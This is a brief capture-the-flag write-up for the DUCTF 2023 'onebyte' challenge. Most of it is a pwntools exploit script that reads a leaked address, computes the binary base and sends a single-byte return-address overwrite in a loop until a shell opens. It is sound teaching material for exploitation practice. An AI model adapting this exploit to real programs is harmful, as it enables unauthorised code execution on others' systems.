# onebyte

Simple ret2win challenge with a single byte overwrite into `rip`. We overwrite return address to an offset and then bruteforce until the stack aligns and we get a shell.

```python
from pwn import *
context.arch = "amd64"

while True:
	io = process("./onebyte")
	# io = remote("2023.ductf.dev", 30018)
	elf = ELF("./onebyte")

	if args.GDB:
		gdb.attach(io)

	io.recvuntil(b"Free junk: ")
	leak = int(io.recvline()[:-1], 16)
	info(f"leak: {hex(leak)}")
	elf.address = leak - 0x11bd
	info(f"base: {hex(elf.address)}")

	payload = p32(elf.sym["win"])*4
	payload += p8(0xb0)
	io.sendlineafter(b": ", payload)

	io.interactive()
```